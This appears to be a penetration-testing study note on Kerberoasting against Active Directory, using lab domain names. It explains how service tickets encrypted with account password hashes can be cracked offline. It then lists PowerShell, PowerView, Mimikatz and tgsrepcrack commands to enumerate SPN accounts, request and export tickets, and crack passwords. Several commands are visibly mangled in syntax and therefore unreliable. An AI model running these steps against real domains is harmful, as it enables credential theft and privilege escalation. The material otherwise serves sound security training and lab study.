# Kerberoasting
Gets the TGS-REP from AS/KDC server and takes it offline to crack the service account passwords. We know that when TGS is requested to access an application service, the TGS is encrypted with the ntlm hash of the target application server. Kerberoasting takes the TGS offline and crack them for service account passwords.

	Why kerberoast should not be targeted at service account, but only user accounts? Because service account machines passwords/keys are usually super long and close to impossible to crack. That is why we should target normal users account used as service accounts. More often than not, the user credentials may be weaker than a machine-service account.

- Offline cracking of service account passwords.
- The Kerberos session ticket (TGS) has a server portion which is
encrypted with the password hash of service account. This makes it
possible to request a ticket and do offline password attack.
- Service accounts are many times ignored (passwords are rarely
changed) and have privileged access.
- Password hashes of service accounts could be used to create Silver
tickets.

# How to kerberoast
1. Find user accounts as service accounts
```powershell
Get-NetUser SPN


# (AD module)
Get ADUser Filter ServicePrincipalName ne ""$null ""} Properties ServicePrincipalName

```

2. Request a TGS

```powershell
Add-Type -AssemblyName System.IdentityModel New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "MSSQLSvc dcorp mgmt.dollarcorp.moneycorp.local"

# Powerview
Request-SPNTicket

# check if TGS granted
klist

#Export all tickets
Invoke-Mimikatz -Command '"kerberos ::list /export"'
```

3. Crack service account password
```powershell
python.exe .\tgsrepcrack.py .\10k-worst-pass.txt .\2-40a10000 student1@MSSQLSvc~dcorp-mgmt.dollarcorp.moneycorp.local-DOLLARCORP.MONEYCORP.LOCAL.kirbi
```